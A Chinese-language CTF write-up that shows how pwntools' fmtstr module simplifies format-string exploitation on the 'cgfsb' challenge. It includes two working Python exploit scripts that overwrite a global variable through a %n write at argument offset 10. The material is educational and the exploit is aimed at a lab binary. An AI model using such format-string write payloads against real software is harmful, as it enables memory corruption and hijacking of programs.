# 简单介绍pwntools fmtstr模块的使用

总所周知，在CTF题目中，有一种很基础但又很令人烦的题型就是格式化字符串，因为我觉得其中的内存构造其实计算得是比较复杂的，但是有了**pwntools**内置的**fmtstr**模块对于很多简单的**Format String Vulnerability**就秒了

## cgfsb

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/2.png)

不难看出这题的解法就是让**pwnme**的值为8就好了，按照传统的做法我们需要测量写入位置的参数然后构造复杂的字符串序列，使用**pwntools**的模块可以大幅简化构造流程，但是我们还是需要测量写入位置

通过 **ida** 查看汇编代码 找到`call printf`的地址（调用**printf(&s)**）。之后我们用**gdb**进行调试，在调用**printf(&s)**之前下一个断点,查看接收 **message** 的变量 **s** 是格式化字符串的第几个参数。输入 **message** 的时候输入 **‘aaaa’**

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/3.png)

查看当前栈中的内容

![img](https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/4.png)

传统的Exploit

```python
from pwn import *
context.log_level = 'debug' 
DEBUG = int(sys.argv[1])
if DEBUG == 1:
	p = process('./cgfsb') 
else: 
	p = remote('10.10.49.194', 30147)
pwnme_addr = 0x0804A068
payload1 = "ABCD" 
payload2 = p32(pwnme_addr) + 'aaaa%10$n'
p.recvuntil('please tell me your name:\n') 
p.sendline(payload1)
p.recvuntil('leave your message please:\n') 
p.sendline(payload2)
print p.recv() 
print p.recv()
```

使用pwntools fmtstr模块的Exploit

```python
from pwn import *
p = remote("111.198.29.45",41020)
#p = process('./fmt')
payload1 = "ABCD"
p.recvuntil('please tell me your name:\n') 
p.sendline(payload1)
payload2 = fmtstr_payload(10,{0x0804A068:0x8})
p.recvuntil('leave your message please:\n') 
p.sendline(payload2)
p.interactive()
```

其中**10**即为参数位置，**0x0804A068**即为需要修改的地址，**0x8**即为需要的值